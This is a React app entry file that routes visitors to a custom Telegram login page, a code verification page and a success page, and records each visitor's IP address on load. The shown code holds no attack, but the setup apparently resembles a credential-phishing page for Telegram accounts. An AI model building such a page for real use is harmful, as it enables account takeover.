import { useEffect, useState } from 'react'
import TelegramLogin from './components/login'
import VerifyCode from './components/verify'
import { BrowserRouter as Router, Routes, Route } from "react-router-dom";
import { ToastContainer } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import SuccessPage from './components/success';

function App() {
  const [ip, setIp] = useState("");

  useEffect(() => {
    // Get user IP for session management
    fetch("https://api64.ipify.org?format=json")
      .then((response) => response.json())
      .then((data) => setIp(data.ip))
      .catch((error) => console.error("Error fetching IP:", error));
  }, []);

  return (
    <>
      <ToastContainer position="top-center" autoClose={3000} />
      <Router>
        <Routes>
          <Route path="/" element={<TelegramLogin />} />
          <Route path="/verify" element={<VerifyCode />} />
          <Route path="/success" element={<SuccessPage />} />
          <Route path="*" element={<TelegramLogin />} /> {/* Fallback route */}
        </Routes>
      </Router>
    </>
  )
}

export default App
